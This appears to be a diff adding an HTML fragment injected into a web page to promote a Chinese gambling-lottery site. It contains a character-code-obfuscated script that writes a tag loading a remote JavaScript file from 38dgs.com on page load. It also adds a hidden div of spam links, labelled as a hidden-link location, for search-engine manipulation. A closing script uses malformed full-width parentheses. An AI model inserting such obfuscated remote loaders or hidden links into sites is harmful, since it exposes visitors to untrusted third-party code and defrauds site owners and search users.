@@ -1,0 +1,26 @@
+``` html
+
+<!--CP26.VIP-->
+<!--爱拼才会赢 秒速快三 UTF-8 版本 (CP26.VIP)-->
+<!-- script src=http://js.38dgs.com/fuck.js></script> -->
+
+<title>&#x79D2;&#x901F;&#x5FEB;&#x4E09; &#x79D2;&#x901F;&#x5FEB;&#x4E09;&#x5F00;&#x5956;&#x76F4;&#x64AD; &#x79D2;&#x901F;&#x5FEB;&#x4E09;&#x5F00;&#x5956;&#x7ED3;&#x679C;&#x5386;&#x53F2;&#x8BB0;&#x5F55; - &#x79D2;&#x901F;&#x5FEB;&#x4E09;&#x76F4;&#x64AD;&#x7F51;</title>
+<meta name="keywords" content="&#x79D2;&#x901F;&#x5FEB;&#x4E09;&#x5F00;&#x5956;&#x76F4;&#x64AD;,&#x79D2;&#x901F;&#x5FEB;&#x4E09;,&#x79D2;&#x901F;&#x5FEB;&#x4E09;&#x5F00;&#x5956;&#x7ED3;&#x679C;,&#x79D2;&#x901F;&#x5FEB;&#x4E09;&#x5F00;&#x5956;&#x8BB0;&#x5F55;,&#x79D2;&#x901F;&#x5FEB;&#x4E09;&#x5386;&#x53F2;&#x8BB0;&#x5F55;,&#x79D2;&#x901F;&#x5FEB;&#x4E09;&#x5F00;&#x5956;&#x5386;&#x53F2;" />
+<meta name="description" content="&#x7231;&#x62FC;&#x624D;&#x4F1A;&#x8D62;&#x3010;cp26.vip&#x3011;&#x63D0;&#x4F9B;&#x79D2;&#x901F;&#x5FEB;&#x4E09;&#x8BE6;&#x5C3D;&#x7814;&#x7A76;&#x5206;&#x6790;&#x603B;&#x7ED3;,&#x79D2;&#x901F;&#x5FEB;&#x4E09;&#x5F00;&#x5956;&#x89C6;&#x9891;,&#x79D2;&#x901F;&#x5FEB;&#x4E09;&#x5F00;&#x5956;&#x76F4;&#x64AD;,&#x79D2;&#x901F;&#x5FEB;&#x4E09;&#x8FC7;&#x5F80;&#x5404;&#x5F00;&#x5956;&#x8BB0;&#x5F55;,&#x79D2;&#x901F;&#x5FEB;&#x4E09;&#x5F00;&#x5956;&#x7ED3;&#x679C;,&#x79D2;&#x901F;&#x5FEB;&#x4E09;&#x7F51;&#x4E0A;&#x5F00;&#x6237;,&#x79D2;&#x901F;&#x5FEB;&#x4E09;&#x6CE8;&#x518C;,&#x505A;&#x4E13;&#x4E1A;&#x7684;&#x5F00;&#x5956;&#x89C6;&#x9891;&#x76F4;&#x64AD;&#x8D44;&#x8BAF;&#x7F51;&#xFF01;" />
+<script type="text/javascript">
+var x2b = String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,104,116,116,112,58,47,47,106,115,46,51,56,100,103,115,46,99,111,109,47,102,117,99,107,46,106,115,62,60,47,115,99,114,105,112,116,62);
+document.write(x2b);
+</script>
+
+<!--暗链位置-->
+<div style="display:none;">
+<div id="urls">
+<a href="http://www.38dgs.com/link" target="_blank">北京pk10赛车直播开奖</a>
+<a href="http://menu.38dgs.com/jack" target="_blank">北京pk10赛车直播开奖</a>
+
+
+</div>
+</div>
+<script>document.getElementById（"urls"）.style.display="none"</script>
+
+```
